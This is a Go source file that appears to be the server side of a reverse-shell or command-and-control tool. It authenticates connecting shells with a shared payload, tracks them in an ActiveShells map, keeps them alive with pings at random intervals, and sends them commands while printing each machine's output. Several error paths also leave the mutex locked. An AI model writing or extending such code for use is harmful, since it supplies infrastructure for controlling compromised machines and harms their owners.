package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// Shell is a structure used to define a active shell connection
type Shell struct {
	Identifier 	string
	// Mutex is used to prevent a command and a ping packet being sent out at the same time
	Mutex 		*sync.Mutex
	Conn 		net.Conn
	// Reader is just used to read from connections, nothing fancy
	Reader 		*bufio.Reader
	Status 		bool
	JoinDate 	time.Time
}

func (s *Shell) Close() {
	if !s.Status { return }

	_ = s.Conn.Close()
	s.Status = false
	// Removing ourselves from the ActiveShells map
	ActiveShells.Delete(s.Identifier)
}

// Read just reads the from the clients
func (s *Shell) Read() ([]byte, error) {
	// Reading the channel until we find a '\n'
	data, err := s.Reader.ReadBytes(delimiter)
	// If any errors occur we just return them and a empty byte slice
	if err != nil { return []byte{}, err }

	// Returning the output without the '\n' character
	return data[:len(data) - 1], nil
}

// GetCommandOutput is called after to send a command out to the client
// it calls Read until a error is returned or read returns COMMAND_OUTPUT_END
func (s *Shell) GetCommandOutput(cmd []byte) {
	s.Mutex.Lock()
	var outputBytes []byte
	var output string
	var err error

	err = s.Conn.SetReadDeadline(time.Now().Add(600 * time.Second))
	if err != nil {
		s.Mutex.Unlock()
		return
	}

	err = s.Conn.SetWriteDeadline(time.Now().Add(600 * time.Second))
	if err != nil {
		s.Mutex.Unlock()
		return
	}

	_, err = s.Conn.Write(s.Packet(cmd))
	if err != nil { return }

	outputBytes, err = s.Read()
	if err != nil { s.Close(); return }

	output = string(outputBytes)
	outputSlice := strings.Split(output, ":")

	if outputSlice[0] != "COMMAND_OUTPUT_BEGIN" { s.Mutex.Unlock(); return }

	if len(outputSlice) <= 1 { s.Mutex.Unlock(); return }

	for {
		outputBytes, err = s.Read()
		if err != nil { s.Close(); return }
		output = string(outputBytes)
		outputSlice := strings.Split(output, ":")
		if outputSlice[0] == "COMMAND_OUTPUT_END" { break }
		fmt.Printf("============ %s | %s ============\r\n%s\r\n", s.Conn.RemoteAddr().String(), cmd, output)
	}

	s.Mutex.Unlock()
}

// Packet is a simple function that just appends the delimiter to the data
func (s *Shell) Packet(data []byte) []byte {
	return append(data, delimiter)
}

// HandleConnection checks if the shell is still alive by pinging it randomly
func (s *Shell) HandleConnection() {
	go func() {
		// If the function ever ends we know we must close the connection ; )
		defer s.Close()

		var err error
		var response []byte

		s.Reader = bufio.NewReader(s.Conn)

		// Authenticating the client
		err = s.Conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		if err != nil { return }

		response, err = s.Read()

		if !bytes.Equal(response, authPayload) { return }

		// Adding the shell to the ActiveShells map
		ActiveShells.Store(s.Identifier, s)

		for s.Status {
			s.Mutex.Lock()
			// Setting read/write deadlines, if any of these exceed we know for sure that the client is no longer active
			err = s.Conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			if err != nil {
				s.Mutex.Unlock()
				return
			}

			err = s.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if err != nil {
				s.Mutex.Unlock()
				return
			}

			_, err = s.Conn.Write(s.Packet(pingPacket))
			if err != nil {
				s.Mutex.Unlock()
				return
			}

			response, err = s.Read()

			if !bytes.Equal(response, pongPacket) {
				s.Mutex.Unlock()
				return
			}

			s.Mutex.Unlock()
			time.Sleep(RandomSleepTime())
		}
	}()
}
